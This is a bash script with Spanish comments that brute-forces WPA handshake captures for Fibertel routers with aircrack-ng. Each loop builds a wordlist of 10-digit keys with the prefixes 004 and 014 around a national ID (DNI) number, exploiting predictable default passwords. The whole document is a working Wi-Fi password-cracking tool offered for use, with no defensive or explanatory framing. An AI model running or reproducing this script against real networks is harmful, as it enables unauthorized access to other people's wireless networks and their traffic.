#!/bin/bash

echo "Ejecutar este script en screen, fibertel 10 digitos"
# $1 ESSID
# $2 file  ejemplo "0XX-01"
# $3 DNI start ejemplo "27"
echo "benchmark......"
echo "0" > key
#aircrack-ng -S

num=$(($3))
echo "$num"
num=$(($num * 100000))
up=$(($num + 100000))
dn=$(($num - 100000))
counter=0
echo "$num"
echo "$up"
echo "$dn"
echo "$counter"

while [ $(cat key) = "0" ]
  do
    #10 digitos, 004, up
    seq -w 004"$(($num + $counter))" 004"$(($up + $counter))" > dic; aircrack-ng -l key -e "$1" -w dic caps/"$2".cap
    if [ $(cat key) != "0" ]
    then
      rm dic
      exit 0
    fi
    #10 digitos, 014, up
    seq -w 014"$(($num + $counter))" 014"$(($up + $counter))" > dic; aircrack-ng -l key -e "$1" -w dic caps/"$2".cap
    if [ $(cat key) != "0" ]
    then
      rm dic
      exit 0
    fi

  #10 digitos, 004, dn
  seq -w 004"$(($dn - $counter))" 004"$(($num - $counter))" > dic; aircrack-ng -l key -e "$1" -w dic caps/"$2".cap
  if [ $(cat key) != "0" ]
  then
    rm dic
    exit 0
  fi
  #10 digitos, 014, dn
  seq -w 014"$(($dn - $counter))" 014"$(($num - $counter))" > dic; aircrack-ng -l key -e "$1" -w dic caps/"$2".cap
  if [ $(cat key) != "0" ]
  then
    rm dic
    exit 0
  fi

  counter=$(($counter + 100000))

done
